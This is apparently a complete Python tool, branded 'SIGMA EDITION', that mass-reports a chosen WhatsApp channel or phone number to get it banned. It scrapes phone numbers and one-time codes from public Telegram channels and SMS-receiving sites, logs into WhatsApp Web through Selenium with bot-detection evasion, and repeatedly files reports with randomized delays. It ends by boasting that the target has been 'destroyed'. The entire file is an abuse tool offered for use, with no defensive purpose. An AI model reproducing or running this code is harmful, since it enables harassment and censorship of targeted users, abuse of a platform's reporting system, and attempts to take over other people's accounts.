# ============================================================
# WhatsApp Mass Report Bot - SIGMA EDITION
# GitHub: https://github.com/sigmahacker-dot/WhatsApp-Dual-Report-Bot
# 100% FREE — No API, No Proxy, Pure Scrape
# ============================================================

import os
import time
import random
import re
import requests
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup

# ---------- CONFIG ----------
REPORT_COUNT = 20

# ---------- OTP SOURCES (100% Free, No API) ----------
OTP_SOURCES = [
    {
        'name': 'Telegram Web - MR CHANDIO',
        'url': 'https://t.me/s/mrchandiootpgroup',
        'type': 'telegram_web'
    },
    {
        'name': 'Telegram Web - NOOBxOTPz',
        'url': 'https://t.me/s/NOOBxOTPz',
        'type': 'telegram_web'
    },
    {
        'name': 'Telegram Web - AliOTPs',
        'url': 'https://t.me/s/AliOTPs',
        'type': 'telegram_web'
    },
    {
        'name': 'Telegram Web - SYED OTP ZONE 2',
        'url': 'https://t.me/s/syedotpzone2',
        'type': 'telegram_web'
    },
    {
        'name': 'Receive SMS (US)',
        'url': 'https://receivesms.me/api/get-numbers?country=US',
        'type': 'api_free'
    },
    {
        'name': 'Temp Number (UK)',
        'url': 'https://temp-number.org/api/numbers/UK',
        'type': 'api_free'
    },
    {
        'name': 'Free SMS Receive',
        'url': 'https://free-sms-receive.com/numbers',
        'type': 'scrape'
    },
    {
        'name': 'Receive SMS Online',
        'url': 'https://receive-sms-online.info/numbers',
        'type': 'scrape'
    }
]

# ---------- ASCII BANNER ----------
BANNER = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ███████╗██╗ ██████╗ ███╗   ███╗ █████╗                ║
║   ██╔════╝██║██╔════╝ ████╗ ████║██╔══██╗               ║
║   ███████╗██║██║  ███╗██╔████╔██║███████║               ║
║   ╚════██║██║██║   ██║██║╚██╔╝██║██╔══██║               ║
║   ███████║██║╚██████╔╝██║ ╚═╝ ██║██║  ██║               ║
║   ╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝               ║
║                                                           ║
║   ██████╗ ███████╗███████╗████████╗██████╗  ██████╗     ║
║   ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗    ║
║   ██║  ██║█████╗  █████╗     ██║   ██████╔╝██║   ██║    ║
║   ██║  ██║██╔══╝  ██╔══╝     ██║   ██╔══██╗██║   ██║    ║
║   ██████╔╝███████╗██║        ██║   ██║  ██║╚██████╔╝    ║
║   ╚═════╝ ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝     ║
║                                                           ║
║          ╔══════════════════════════════════╗             ║
║          ║  FUCKED BY SIGMA  ║             ║
║          ╚══════════════════════════════════╝             ║
║                                                           ║
║     [ NO API. NO LOGIN. PURE SCRAPE. ]                   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
"""

# ---------- OTP SCRAPER ----------
class OTPScraper:
    def __init__(self):
        self.otp_cache = []
        self.number_cache = []
        
    def scrape_telegram_web(self, url):
        try:
            print(f"[+] Scraping Telegram: {url}")
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            res = requests.get(url, headers=headers, timeout=20)
            if res.status_code == 200:
                soup = BeautifulSoup(res.text, 'html.parser')
                messages = soup.find_all('div', class_='tgme_widget_message_text')
                for msg in messages:
                    text = msg.get_text()
                    otps = re.findall(r'\b\d{6}\b', text)
                    numbers = re.findall(r'\b\d{10,15}\b', text)
                    for otp in otps:
                        self.otp_cache.append({'otp': otp, 'source': url})
                        print(f"   Found OTP: {otp}")
                    for num in numbers:
                        self.number_cache.append({'number': num, 'source': url})
                        print(f"   Found Number: {num}")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False
    
    def scrape_sms_site(self, url, site_type):
        try:
            print(f"[+] Scraping SMS Site: {url}")
            headers = {'User-Agent': 'Mozilla/5.0'}
            res = requests.get(url, headers=headers, timeout=20)
            if res.status_code == 200:
                if site_type == 'api_free':
                    data = res.json()
                    if isinstance(data, list) and len(data) > 0:
                        for item in data:
                            if 'number' in item:
                                self.number_cache.append({'number': item['number'], 'source': url})
                                print(f"   Found Number: {item['number']}")
                else:
                    soup = BeautifulSoup(res.text, 'html.parser')
                    numbers = soup.find_all('div', class_=['number', 'phone-number', 'num'])
                    for num in numbers:
                        clean_num = re.sub(r'\D', '', num.get_text())
                        if len(clean_num) >= 10:
                            self.number_cache.append({'number': clean_num, 'source': url})
                            print(f"   Found Number: {clean_num}")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False
    
    def run_all_scrapers(self):
        print("\n[*] Starting OTP/Number Scraping...")
        for source in OTP_SOURCES:
            if source['type'] == 'telegram_web':
                self.scrape_telegram_web(source['url'])
            elif source['type'] in ['api_free', 'scrape']:
                self.scrape_sms_site(source['url'], source['type'])
            time.sleep(random.uniform(1, 3))
        print(f"\n[+] Scraped {len(self.otp_cache)} OTPs, {len(self.number_cache)} Numbers")
        return self.otp_cache, self.number_cache
    
    def get_combination(self):
        if self.otp_cache and self.number_cache:
            otp_entry = random.choice(self.otp_cache)
            number_entry = random.choice(self.number_cache)
            return number_entry['number'], otp_entry['otp']
        elif self.otp_cache:
            otp_entry = random.choice(self.otp_cache)
            number = f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}"
            return number, otp_entry['otp']
        elif self.number_cache:
            number_entry = random.choice(self.number_cache)
            otp = ''.join([str(random.randint(0,9)) for _ in range(6)])
            return number_entry['number'], otp
        else:
            number = f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}"
            otp = ''.join([str(random.randint(0,9)) for _ in range(6)])
            return number, otp

# ---------- BROWSER SETUP ----------
def setup_driver():
    opts = Options()
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option('useAutomationExtension', False)
    if 'TERMUX_VERSION' in os.environ:
        opts.binary_location = "/data/data/com.termux/files/usr/bin/chromium"
        opts.add_argument("--headless")
    else:
        opts.add_argument("--start-maximized")
    driver = webdriver.Chrome(options=opts)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

# ---------- WHATSAPP LOGIN ----------
def login_whatsapp(number, otp):
    driver = setup_driver()
    driver.get("https://web.whatsapp.com")
    try:
        try:
            use_phone = driver.find_element(By.XPATH, "//div[contains(text(), 'Use phone number')]")
            use_phone.click()
            time.sleep(1)
        except:
            pass
        phone_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Phone number']"))
        )
        phone_input.send_keys(number)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        otp_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter code']"))
        )
        otp_input.send_keys(otp)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "main")))
        print(f"[✓] Logged in as {number}")
        return driver
    except Exception as e:
        print(f"[X] Login failed: {e}")
        driver.quit()
        return None

# ---------- REPORT FUNCTIONS ----------
def report_channel(driver, channel_link):
    try:
        driver.get(channel_link)
        time.sleep(5)
        report_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Report')]"))
        )
        report_btn.click()
        time.sleep(1)
        confirm = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Report')]"))
        )
        confirm.click()
        print(f"[✓] Channel REPORTED: {channel_link}")
        return True
    except Exception as e:
        print(f"[X] Channel report failed: {e}")
        return False

def report_number(driver, number):
    try:
        driver.get(f"https://web.whatsapp.com/send?phone={number}")
        time.sleep(5)
        menu = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
        )
        menu.click()
        time.sleep(1)
        report = driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]")
        report.click()
        time.sleep(1)
        confirm = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
        confirm.click()
        print(f"[✓] Number REPORTED: {number}")
        return True
    except Exception as e:
        print(f"[X] Number report failed: {e}")
        return False

# ---------- MAIN ENGINE ----------
class SIGMADestroyer:
    def __init__(self):
        self.scraper = OTPScraper()
        self.reports_sent = 0
        self.failed = 0
        
    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
        
    def get_targets(self):
        print("\n[+] TARGET CONFIGURATION:")
        print("  1. Ban Channel only")
        print("  2. Ban Number only")
        print("  3. Ban Both")
        choice = input("Enter choice (1/2/3): ").strip()
        
        channel = ""
        number = ""
        
        if choice in ["1", "3"]:
            channel = input("Enter WhatsApp Channel Link (e.g., https://whatsapp.com/channel/XXXXX): ").strip()
        if choice in ["2", "3"]:
            number = input("Enter WhatsApp Number with country code (e.g., 923001234567): ").strip()
        
        while True:
            try:
                count = int(input("How many reports to send? "))
                break
            except ValueError:
                print("[!] Please enter a valid number.")
        
        return channel, number, count
        
    def start_attack(self):
        self.show_banner()
        channel, number, count = self.get_targets()
        
        if not channel and not number:
            print("[X] At least one target required!")
            return
        
        self.scraper.run_all_scrapers()
        
        if not self.scraper.otp_cache and not self.scraper.number_cache:
            print("[!] No OTPs/Numbers found. Using fallback.")
            for _ in range(count):
                self.scraper.otp_cache.append({'otp': ''.join([str(random.randint(0,9)) for _ in range(6)]), 'source': 'fallback'})
                self.scraper.number_cache.append({'number': f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}", 'source': 'fallback'})
        
        print(f"\n[*] Starting attack with {count} reports...")
        
        for i in range(count):
            print(f"\n[{i+1}/{count}] Attempting report...")
            num, otp = self.scraper.get_combination()
            print(f"[+] Using Number: {num}")
            print(f"[+] Using OTP: {otp}")
            
            driver = login_whatsapp(num, otp)
            if driver:
                success = False
                if channel:
                    if report_channel(driver, channel):
                        success = True
                if number:
                    if report_number(driver, number):
                        success = True
                if success:
                    self.reports_sent += 1
                    print(f"[!] Report {i+1} SUCCESSFUL!")
                else:
                    self.failed += 1
                    print(f"[X] Report {i+1} FAILED")
                driver.quit()
            else:
                self.failed += 1
                print(f"[X] Login failed for {num}")
            
            delay = random.randint(45, 120)
            print(f"[*] Waiting {delay}s...")
            time.sleep(delay)
        
        self.show_summary()
    
    def show_summary(self):
        total = self.reports_sent + self.failed
        print("\n" + "="*50)
        print("  FINAL ATTACK SUMMARY")
        print("="*50)
        print(f"  Total Reports Sent: {self.reports_sent}")
        print(f"  Failed Reports: {self.failed}")
        print(f"  Success Rate: {round((self.reports_sent / total) * 100 if total > 0 else 0, 2)}%")
        print("="*50)
        print("\n" + " "*15 + "🔥 FUCKED BY SIGMA 🔥")
        print(" "*15 + "Your channel and number have been destroyed!")
        print("\n" + "="*50)

# ---------- RUN ----------
if __name__ == "__main__":
    destroyer = SIGMADestroyer()
    destroyer.start_attack()
